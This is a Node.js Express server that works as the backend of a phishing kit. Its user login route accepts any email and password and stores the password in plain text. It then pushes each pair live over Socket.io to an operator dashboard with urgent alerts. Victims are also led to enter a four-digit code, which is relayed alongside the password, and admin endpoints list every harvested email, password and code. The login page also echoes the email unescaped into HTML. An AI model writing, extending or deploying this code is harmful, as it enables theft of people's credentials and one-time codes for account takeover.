require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Ensure proper MIME types
app.use((req, res, next) => {
  if (req.url.endsWith('.html')) {
    res.setHeader('Content-Type', 'text/html');
  } else if (req.url.endsWith('.js')) {
    res.setHeader('Content-Type', 'application/javascript');
  } else if (req.url.endsWith('.css')) {
    res.setHeader('Content-Type', 'text/css');
  }
  next();
});

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true
});

// Test database connection
pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next(new Error('Authentication error'));
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Authentication error'));
    socket.user = user;
    next();
  });
});

// Debug all socket emissions
const originalEmit = io.emit;
io.emit = function(event, data) {
  console.log(`📤 Socket Emit: ${event}`, data);
  return originalEmit.call(this, event, data);
};

// Socket.io connection
io.on('connection', (socket) => {
  console.log('👤 Admin connected:', socket.id);
  
  socket.emit('test-notification', { 
    message: 'Connected to real-time server',
    timestamp: new Date()
  });
  
  socket.on('disconnect', () => console.log('👤 Admin disconnected:', socket.id));
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(4),
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    await pool.query(`
      CREATE OR REPLACE FUNCTION update_updated_at_column()
      RETURNS TRIGGER AS $$
      BEGIN
          NEW.updated_at = CURRENT_TIMESTAMP;
          RETURN NEW;
      END;
      $$ language 'plpgsql';
    `);

    await pool.query(`
      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
      CREATE TRIGGER update_users_updated_at
          BEFORE UPDATE ON users
          FOR EACH ROW
          EXECUTE FUNCTION update_updated_at_column();
    `);

    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization completed');
    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

// USER ENDPOINTS

// User login - INSTANT NOTIFICATION TO ADMIN
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    await pool.query(`
      INSERT INTO users (email, password, otp_verified) 
      VALUES ($1, $2, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL
    `, [email, password]);

    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - New Login:', email);
    
    io.emit('user-login', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔐 New user login attempt',
      notification: {
        sound: 'urgent',
        vibrate: true,
        duration: 5000,
        priority: 'high'
      }
    });

    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Loading...</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .loading-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
          }
          .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          .email { color: #667eea; font-weight: bold; }
        </style>
        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
      </head>
      <body>
        <div class="loading-container">
          <h2>Processing your request...</h2>
          <div class="spinner"></div>
          <p>Please wait, redirecting to OTP creation for <span class="email">${email}</span>...</p>
        </div>
      </body>
      </html>
    `);
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Save user-created OTP - INSTANT NOTIFICATION TO ADMIN
app.post('/api/users/save-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    
    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP required' });
    }

    if (!/^\d{4}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be exactly 4 digits' });
    }

    const result = await pool.query(
      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp, password',
      [otp, email]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }

    const user = result.rows[0];

    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - OTP Created:', email, 'OTP:', otp);
    
    io.emit('user-otp-created', { 
      email: user.email,
      password: user.password,
      otp: user.otp,
      timestamp: new Date(),
      message: '✅ User has created and verified their OTP successfully',
      notification: {
        sound: 'success',
        vibrate: true,
        duration: 5000,
        priority: 'high'
      }
    });

    console.log('✅ User OTP saved and verified for:', email, 'OTP:', otp);
    res.json({ success: true, message: 'OTP saved successfully' });
  } catch (error) {
    console.error('❌ Save OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Reset OTP process
app.post('/api/users/reset', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    const userResult = await pool.query('SELECT password FROM users WHERE email = $1', [email]);
    const password = userResult.rows[0]?.password || 'unknown';

    await pool.query(
      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0 WHERE email = $1',
      [email]
    );
    
    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - User Reset:', email);
    
    io.emit('user-reset', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔄 User reset OTP process - starting over',
      notification: {
        sound: 'warning',
        vibrate: true,
        duration: 5000,
        priority: 'medium'
      }
    });

    res.json({ success: true, message: 'OTP process reset. Please login again.' });
  } catch (error) {
    console.error('❌ Reset error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ADMIN ENDPOINTS

app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      ORDER BY created_at DESC
    `);
    
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users/:email', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.params;
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      WHERE email = $1
    `, [email]);
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    res.json(result.rows[0]);
  } catch (error) {
    console.error('❌ Admin user detail error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

app.get('/api/test-db', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW() as time');
    res.json({ success: true, time: result.rows[0].time });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// Start server
const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
      console.log('\n📢 Socket.io server ready for real-time notifications\n');
    });
  } else {
    process.exit(1);
  }
});

process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
